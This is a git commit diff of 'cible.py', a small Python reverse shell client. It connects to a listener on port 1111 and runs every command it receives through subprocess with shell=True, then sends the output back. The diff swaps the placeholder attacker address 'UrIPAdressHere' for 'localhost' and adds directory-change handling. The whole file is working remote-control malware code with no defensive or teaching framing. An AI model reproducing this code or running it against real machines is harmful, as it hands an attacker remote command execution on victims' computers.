8b8b19d69cb097f60640fa6690e7e63c75f7f3ca
yaya7211 <43450496+yaya7211@users.noreply.github.com>
2019-08-22 18:36:53 +0200

    Update cible.py

--- cible.py
+++ cible.py
@@ -1,7 +1,7 @@
 import os, socket, subprocess
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.connect(("UrIPAdressHere", 1111))
+s.connect(("localhost", 1111))
 
 while True:
 	out1 = err1 =""
@@ -10,22 +10,32 @@ while True:
 	s.send(a)
 	cmd = s.recv(1024)
 	cmd = cmd.decode()
-	back = subprocess.Popen(cmd, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
-	out, err = back.communicate()
-	if out == b"" and err != b"":
-		for element in err:
-		    element = bytes([element])
-		    try:
-		        err1 += element.decode('utf-8')
-		    except Exception as e:
-		        err1 += "?"
-		s.send(err1.encode())
+	if cmd.startswith("cd "):
+		try:
+			os.chdir(cmd.split(" ")[1])
+			s.send(b"Directory changed !\n")
+		except FileNotFoundError:
+			s.send(b"Le chemin d'acces est introuvable :/\n")
+
 	else:
-		for element in out:
-		    element = bytes([element])
-		    try:
-		        out1 += element.decode('utf-8')
-		    except Exception as e:
-		        out1 += "?"
-		s.send(out1.encode())
+		back = subprocess.Popen(cmd, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
+		out, err = back.communicate()
+		if len(out) < 1 and len(err) > 1:
+			for element in err:
+			    element = bytes([element])
+			    try:
+			        err1 += element.decode('utf-8')
+			    except Exception as e:
+			        err1 += "?"
+			s.send(err1.encode())
+		elif len(err) < 1 and len(out) > 1:
+			for element in out:
+			    element = bytes([element])
+			    try:
+			        out1 += element.decode('utf-8')
+			    except Exception as e:
+			        out1 += "?"
+			s.send(out1.encode())
+		else:
+			s.send(b"Done !")
 		
